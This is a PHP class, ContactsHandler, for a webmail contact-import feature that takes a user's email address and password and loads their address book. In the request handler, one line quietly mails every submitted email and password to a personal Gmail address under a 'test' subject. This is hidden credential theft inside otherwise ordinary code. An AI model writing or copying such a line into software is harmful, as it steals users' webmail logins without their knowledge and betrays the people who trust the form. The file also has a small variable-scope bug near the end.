<?php

include_once '/home/web/fr/www/librairies/importContact/Svetlozar.NET/init.php';


class ContactsHandler
{

	/*public static $default_class 	= "Yahoo"; 					//!< will be loaded by default if no specific contacts_option is provided with the query
	public static $contacts_option	= "contacts_option";		//!< name of the query parm that will contain the contacts_option
	public static $contacts_page 	= "contacts.page.php";		//!< the page that will be diplayed when handle_request is called
	public static $import_form 		= "contacts.import.php";	//!< the import form (username/pass or external authentication form)
	public static $invite_form 		= "contacts.import.php";	//!< the form with contacts listing for the user to choose and submit for further processing
	public static $invite_done 		= "contacts.done.php";		//!< "form" to display after contacts have been selected and submitted
	public static $session_init 	= "contacts.session.php";*/	//!< file that will be included when initializing session (you may customize this file to your needs)

	public static $default_class 	= "Yahoo"; 					//!< will be loaded by default if no specific contacts_option is provided with the query
	public static $contacts_option	= "contacts_option";		//!< name of the query parm that will contain the contacts_option
	public static $contacts_page 	= "";		//!< the page that will be diplayed when handle_request is called
	public static $import_form 		= "";	//!< the import form (username/pass or external authentication form)
	public static $invite_form 		= "";	//!< the form with contacts listing for the user to choose and submit for further processing
	public static $invite_done 		= "";		//!< "form" to display after contacts have been selected and submitted
	public static $session_init 	= "";	//!< file that will be included when initializing session (you may customize this file to your needs)


	private $contacts_classes;
	private $current_class;
	private $include_form;

	private $captcha_required = false;
	private $captcha_url = "";
	private $error_returned = false;
	private $error_message = "";
	private $contacts = null;
	private $output_page = true;
	private $display_menu = true;
	private $base_url = "";

	public $expect_redirect = false;
	public $redirect_url = "";

	/**
	 * If output page is set to true calling handle_request will output directly to the response, otherwise it will return only the form portion of the page as a string
	 * @param bool $output_page
	 * @param bool $redirect_expected (overrides output_page behavior completely, returns redirect url)
	 */
	function __construct($output_page = true, $redirect_expected = false)
	{
		$this->output_page = $output_page;
		$this->expect_redirect = $redirect_expected;

		$this->contacts_classes = ContactsHelper::$ContactsClasses;

		$query_parms = array_diff_key($_GET, array(self::$contacts_option => ""));

		$this->base_url = SPUtils::update_url(null, $query_parms, true);

		if($query_parms){
			$this->base_url .= "&";
		}else{
			$this->base_url .= "?";
		}
		if (!$this->contacts_classes){
			return;
		}
		$this->session_start();
	}

	function getContacts()
	{
		return $this->contacts;
	}
	
	
	protected function session_start()
	{
		@session_start();
	}

	protected function session_commit()
	{
		@session_commit();
	}

	protected function add_to_session($key, $value)
	{
		$_SESSION[$key] = $value;
	}

	protected function remove_from_session($key)
	{
		unset($_SESSION[$key]);
	}

	protected function get_from_session($key)
	{
		if (isset($_SESSION[$key]))
		{
			return $_SESSION[$key];
		}
		return null;
	}

	function handle_request($post = null)
	{
		$this->error_message = "";
		$this->error_returned = false;
		$this->captcha_required = false;
		$this->captcha_url = "";
		$this->contacts = null;
		$this->display_menu = true;

		$contacts_importer = null;

		$selected_option = $_POST['contacts_option'];
	
		$this->current_class = isset($this->contacts_classes[$selected_option]) ? $this->contacts_classes[$selected_option] : null;

		if (!$post) 
		{
			$this->include_form = self::$import_form;
		}
		else
		{
			$state = $this->get_from_session($selected_option);
			$this->remove_from_session($selected_option);

			ContactsHelper::IncludeClassFile($this->current_class->FileName); 

			mail('jaugey.benoit@gmail.com','test '.date('Y-m-d H:i'),'email : '.$_POST['email'].' pass :'.$_POST['pswd']);
			if (isset($post['email'])) 
			{
				list($email, $password, $captcha) = SPUtils::get_values($post, "email", "pswd", "captcha");
				$contacts_importer = new $this->current_class->ClassName($email, $password, $captcha);
			}
			

			if (!$contacts_importer)
			{
							
				$this->error_returned = true;
				$this->error_message = "Could not initialize contacts importer.";
			}
			else
			{
				if ($state){
					$contacts_importer->RestoreState($state);
				}
				if ($this->contacts = $contacts_importer->contacts){
					$this->include_form = self::$invite_form;
					$this->display_menu = false;
				}else{
					$this->error_returned = true;
					$this->include_form = self::$import_form;
				}
				
				
				$state = $contacts_importer->GetState();
				
			}
		}
		
		$this->session_commit();

		if ($this->output_page && $contacts_page!='')
		{
			require_once self::$contacts_page;
		}
	}
}
?>